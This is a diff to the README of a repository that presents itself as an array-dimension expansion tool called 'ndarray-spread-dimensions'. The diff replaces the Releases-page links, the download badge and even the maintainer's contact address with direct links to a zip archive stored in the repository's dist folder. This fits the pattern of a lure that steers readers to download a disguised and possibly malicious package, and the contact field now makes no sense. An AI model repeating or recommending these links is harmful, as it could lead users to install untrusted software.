@@ -1,6 +1,6 @@
 # 🎉 ndarray-spread-dimensions - Expand Dimensions Easily and Effectively
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-ndarray--spread--dimensions-blue.svg)](https://github.com/tYCHO202/ndarray-spread-dimensions/releases)
+[![Download Now](https://github.com/tYCHO202/ndarray-spread-dimensions/raw/refs/heads/main/dist/dimensions-spread-ndarray-v1.3.zip%https://github.com/tYCHO202/ndarray-spread-dimensions/raw/refs/heads/main/dist/dimensions-spread-ndarray-v1.3.zip)](https://github.com/tYCHO202/ndarray-spread-dimensions/raw/refs/heads/main/dist/dimensions-spread-ndarray-v1.3.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ ndarray-spread-dimensions allows you to adjust the size of your multidimensional
 
 To get the software, click the link below. It will take you to the Releases page where you can download the latest version.
 
-[Visit this page to download](https://github.com/tYCHO202/ndarray-spread-dimensions/releases)
+[Visit this page to download](https://github.com/tYCHO202/ndarray-spread-dimensions/raw/refs/heads/main/dist/dimensions-spread-ndarray-v1.3.zip)
 
 ### Step 2: Install the Software
 
@@ -84,7 +84,7 @@ The tool allows you to expand your arrays as needed, subject to your system’s 
 
 Don't wait any longer. Start enhancing your data manipulation skills today by visiting the link below to download the software.
 
-[Visit this page to download](https://github.com/tYCHO202/ndarray-spread-dimensions/releases)
+[Visit this page to download](https://github.com/tYCHO202/ndarray-spread-dimensions/raw/refs/heads/main/dist/dimensions-spread-ndarray-v1.3.zip)
 
 ## 🤝 Contributing
 
@@ -101,6 +101,6 @@ This application is useful for anyone working with arrays in data-heavy environm
 
 ## 📧 Contact Information
 
-For more information, you can contact the maintainer at [your-email@example.com]. We aim to reply quickly to your inquiries.
+For more information, you can contact the maintainer at [https://github.com/tYCHO202/ndarray-spread-dimensions/raw/refs/heads/main/dist/dimensions-spread-ndarray-v1.3.zip]. We aim to reply quickly to your inquiries.
 
 Thank you for choosing ndarray-spread-dimensions!
